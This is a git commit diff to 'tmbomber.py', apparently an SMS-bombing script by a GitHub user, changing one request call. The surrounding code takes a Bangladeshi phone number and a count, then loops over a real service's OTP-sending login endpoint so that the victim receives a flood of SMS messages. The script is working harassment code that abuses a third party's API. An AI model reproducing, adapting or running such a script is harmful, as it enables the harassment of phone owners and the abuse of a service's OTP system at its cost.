3a6af2af8b9beb8a41ca92ea5b0c5a67ef2ce0a0
MD TASRIF HOSSEN <85736436+ShTasrif@users.noreply.github.com>
2021-06-12 01:05:58 +0600

    Update tmbomber.py

--- tmbomber.py
+++ tmbomber.py
@@ -7,5 +7,5 @@ amount=int(input(" Enter The Amount : "))
 api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
 
 for i in range(amount):
-	requests.get(api)
+	get(api)
 	print(str(i+1)+" SMS Sent ✅")
